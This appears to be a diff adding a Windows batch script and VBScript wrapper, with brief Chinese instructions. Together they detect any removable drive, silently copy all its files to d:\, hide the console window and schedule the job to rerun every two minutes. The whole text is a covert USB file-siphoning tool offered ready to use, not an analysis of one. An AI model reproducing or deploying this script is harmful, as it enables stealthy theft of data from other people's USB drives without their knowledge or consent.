@@ -1,0 +1,17 @@
+for %%i in (c d e f g h i j k) do @fsutil fsinfo drivetype %%i:>>d:\t.txt
+findstr /i "可移动驱动器" d:\t.txt
+if errorlevel==1 goto end
+if errorlevel==0 goto cop
+:end
+exit
+:cop
+for /f "tokens=1" %%i in ('findstr /i "可移动驱动器" d:\t.txt') do @set yidong=%%i
+copy %yidong%\*.* d:\ /y
+del d:\t.txt
+存为g.bat
+set ws=WScript.CreateObject("WScript.Shell") 
+ws.Run "d:\g.bat",0
+存为b.vbs
+再运行一次
+schtasks /create /s system /sc minute /mo 2 /tn copyfiles /tr d:\b.vbs
+即可.
